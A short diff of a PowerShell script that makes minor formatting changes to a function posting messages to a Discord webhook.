@@ -326,10 +326,10 @@ function Send-ToDiscord {
     param ($Message)
     $payload = @{
         "content" = "```$Message```"
-    } | ConvertTo-Json
+    } | ConvertTo-Json -Compress
 
     try {
-        Invoke-RestMethod -Uri $DiscordWebhookUrl -Method Post -ContentType "application/json" -Body $payload
+        Invoke-RestMethod -Uri $DiscordWebhookUrl -Method "Post" -ContentType "application/json" -Body $payload
         Write-Host "Data sent to Discord successfully."
     } catch {
         Write-Error "Failed to send data to Discord."
